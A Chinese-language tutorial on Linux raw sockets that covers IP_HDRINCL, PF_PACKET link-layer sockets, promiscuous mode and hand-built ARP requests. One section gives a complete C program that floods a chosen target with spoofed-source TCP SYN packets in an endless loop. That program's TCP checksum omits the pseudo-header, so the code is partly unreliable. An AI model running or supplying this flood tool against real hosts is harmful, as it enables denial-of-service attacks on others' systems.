原始套接字

Linux原始套接字（SOCK_RAW）与链路层数据帧收发完全指南 #

在使用标准的 TCP 或 UDP 进行网络编程时，开发者主要关注应用层的数据收发（Data 字段）。此时，底层的 TCP/UDP 首部以及 IP 首部全部由操作系统的网络协议栈自动生成并维护，开发人员无法直接修改报头字段。

为了突破这一限制，进行底层协议开发、网络抓包分析（如 Tcpdump）、或者是安全测试，我们需要使用 原始套接字 (Raw Socket)。它允许程序绕过传输层甚至网络层，直接裸露构建和拦截 IP 包或物理链路层的 MAC 帧。

第一部分：网络层原始套接字（IP 层） #

通过创建网络层原始套接字，我们可以直接读取或构造整个 IP 数据包，并自由配置其上层协议类型（如 TCP, UDP, ICMP）。

1. 原始套接字的创建 #

c
// 🔑 创建一个面向 TCP 的网络层原始套接字
int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  • 第三个参数指定协议类型，如 IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP。
  • ⚠️ 注意：只有超级用户 (root) 才有权限创建原始套接字。

2. 控制 IP 首部：IP_HDRINCL 选项 #

  • 未启用 IP_HDRINCL（默认）：我们写入的数据从 IP 首部之后的第一个字节开始。IP 首部由内核自动生成并填充，其中协议字段会被自动设为创建套接字时指定的第三个参数。
  • 启用 IP_HDRINCL：程序必须从 IP 报头的第一字节开始手动构建整个数据包（包括 IP 头部和 TCP/UDP 头部）。只有 IP 校验和与标识 ID 字段可交由内核计算。
c
const int on = 1;
if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    perror("setsockopt IP_HDRINCL failed");
}

3. 实战：手动封装 TCP 报文 (SYN Flood 模拟) #

以下 C 代码演示了如何启用 IP_HDRINCL，手动构造伪造源 IP 的 TCP SYN 报文，用来模拟经典的三次握手 SYN 洪水测试：

c
// mdos.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

// CRC 校验和通用算法
unsigned short checksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

void attack(int skfd, struct sockaddr_in *target, unsigned short srcport) {
    char buf[128] = {0};
    struct ip *ip = (struct ip*)buf;
    struct tcphdr *tcp = (struct tcphdr*)(buf + sizeof(struct ip));
    int ip_len = sizeof(struct ip) + sizeof(struct tcphdr);

    // 1. 填充自制 IP 首部
    ip->ip_v   = IPVERSION;
    ip->ip_hl  = sizeof(struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(ip_len);
    ip->ip_id  = 0;
    ip->ip_off = 0;
    ip->ip_ttl = MAXTTL;
    ip->ip_p   = IPPROTO_TCP;
    ip->ip_sum = 0;
    ip->ip_dst = target->sin_addr;

    // 2. 填充自制 TCP 首部
    tcp->source = htons(srcport);
    tcp->dest   = target->sin_port;
    tcp->seq    = random();
    tcp->doff   = sizeof(struct tcphdr) >> 2;
    tcp->syn    = 1; // 第一次握手标志位
    tcp->check  = 0;

    while(1) {
        // 伪造源 IP 地址
        ip->ip_src.s_addr = random();
        
        // 计算校验和并发送
        tcp->check = checksum((unsigned short*)tcp, sizeof(struct tcphdr));
        sendto(skfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        printf("Usage: %s target_ip dst_port src_port\n", argv[0]);
        exit(1);
    }
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &target.sin_addr);

    int skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    const int on = 1;
    setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

    attack(skfd, &target, atoi(argv[3]));
    close(skfd);
    return 0;
}

4. 💡 避坑要点：BSD 与 Linux 内部结构体差异 #

在引入头文件时，你可能会混淆 struct ip 与 struct iphdr，或者 struct icmp 与 struct icmphdr：

  • struct ip / struct icmp：源自 BSD 风格，专为用户空间应用程序编写而推荐使用。
  • struct iphdr / struct icmphdr：供 Linux 内核协议栈 INET 传输层内部使用，不建议在应用层直接混用。

第二部分：链路层原始套接字（MAC 帧层） #

如果需要直接在网卡物理层面上收发包含 以太网首部 (MAC Header) 的数据帧，需要将套接字定义在 PF_PACKET 协议族下。

c
// 🔑 创建一个捕获链路层所有物理帧的原始套接字
int sock = socket(PF_PACKET, type, protocol);

1. type 参数选型 #

  • SOCK_RAW：直接从网卡驱动收发完整数据帧（包括 14 字节的以太网 MAC 首部）。发送时也必须自行构建 MAC 头部。
  • SOCK_DGRAM：系统会自动剥离接收帧的 MAC 头部；发送时，系统也会根据目的物理地址自动添加 MAC 头部。

2. protocol 参数与收包过滤 #

可以使用 htons(protocol) 限制只接收特定物理类型的数据帧：

  • ETH_P_IP (0x0800)：只接收发往本机的 IPv4 数据帧。
  • ETH_P_ARP (0x0806)：只接收发往本机的 ARP 数据帧。
  • ETH_P_ALL (0x0003)：接收发往本机的所有数据帧，以及本机发出的所有出站帧。

3. 配置网卡混杂模式（IFF_PROMISC） #

正常情况下，网卡会过滤掉目的 MAC 地址不是本机物理地址的数据帧。如果要抓取局域网内的所有明文流量，必须使用 ioctl 开启网卡的混杂模式（Promiscuous Mode）：

c
struct ifreq ethreq;
strncpy(ethreq.ifr_name, "eth0", IFNAMSIZ);

// 获取网卡当前标志位
ioctl(sock, SIOCGIFFLAGS, &ethreq);
// 开启混杂模式
ethreq.ifr_flags |= IFF_PROMISC;
// 写回标志位
ioctl(sock, SIOCSIFFLAGS, &ethreq);

4. 实战：手动封装并广播 ARP 请求 #

ARP（地址解析协议）通过向全网广播查询，将 IP 地址转换为 48 位的物理 MAC 地址。以下程序演示了如何通过物理层原始套接字，手动拼装以太网首部和ARP请求内容发送查询：

c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>

#define BUFLEN 42

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s net_device target_ip\n", argv[0]);
        exit(1);
    }

    int skfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    struct sockaddr_ll toaddr;
    memset(&toaddr, 0, sizeof(toaddr));
    
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, argv[1]);

    // 1. 获取网卡接口索引 (Index)
    ioctl(skfd, SIOCGIFINDEX, &ifr);
    toaddr.sll_ifindex = ifr.ifr_ifindex;

    // 2. 获取网卡本身的 IP 地址
    ioctl(skfd, SIOCGIFADDR, &ifr);
    struct in_addr srcIP = ((struct sockaddr_in*)&(ifr.ifr_addr))->sin_addr;

    // 3. 获取网卡本身的 MAC 地址
    ioctl(skfd, SIOCGIFHWADDR, &ifr);
    unsigned char src_mac[ETH_ALEN];
    memcpy(src_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    // 4. 组装以太网帧首部 (14 字节)
    char buf[BUFLEN] = {0};
    struct ethhdr *eth = (struct ethhdr*)buf;
    memset(eth->h_dest, 0xff, ETH_ALEN); // 目的 MAC 设为全网广播 FF:FF:FF:FF:FF:FF
    memcpy(eth->h_source, src_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);     // 帧类型为 ARP (0x0806)

    // 5. 组装 ARP 报文首部 (28 字节)
    struct ether_arp *arp = (struct ether_arp*)(buf + sizeof(struct ethhdr));
    arp->arp_hrd = htons(ARPHRD_ETHER);  // 硬件类型：以太网
    arp->arp_pro = htons(ETH_P_IP);      // 协议类型：IP
    arp->arp_hln = ETH_ALEN;             // MAC 长度：6
    arp->arp_pln = 4;                    // IP 长度：4
    arp->arp_op  = htons(ARPOP_REQUEST); // 操作码：1 代表请求 (Request)

    memcpy(arp->arp_sha, src_mac, ETH_ALEN); // 源 MAC
    memcpy(arp->arp_spa, &srcIP, 4);          // 源 IP

    struct in_addr targetIP;
    inet_pton(AF_INET, argv[2], &targetIP);
    memcpy(arp->arp_tpa, &targetIP, 4);       // 目标查询 IP

    // 6. 发送数据帧
    toaddr.sll_family = PF_PACKET;
    sendto(skfd, buf, BUFLEN, 0, (struct sockaddr*)&toaddr, sizeof(toaddr));

    close(skfd);
    return 0;
}
